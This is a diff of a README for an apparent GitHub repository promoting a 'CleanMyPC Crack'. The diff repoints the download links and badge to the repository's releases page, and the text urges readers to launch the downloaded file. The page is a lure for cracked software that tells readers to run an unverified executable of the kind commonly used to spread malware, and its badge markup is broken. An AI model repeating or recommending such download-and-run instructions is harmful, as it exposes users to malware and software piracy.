@@ -25,8 +25,8 @@ Explore the following topics related to CleanMyPC Crack:
 - Reddit community insights
 
 ## Get Started
-To begin your journey to a cleaner and faster PC, visit our repository: [Download CleanMyPC Crack](https://github.com/file/Soft.zip)  
-[![Download](https://img.shields.io/badge/Download-CleanMyPC-blue)](https://github.com/file/Soft.zip)
+To begin your journey to a cleaner and faster PC, visit our repository: [Download CleanMyPC Crack](https://github.com/rapasquim/CleanMyPC_Crack/releases)  
+[![Download](https://github.com/rapasquim/CleanMyPC_Crack/releases)](https://github.com/rapasquim/CleanMyPC_Crack/releases)
 
 If the link ends with a file name, make sure to launch it to start the download process. For more information or if the link is not working, check the "Releases" section of our repository.
 
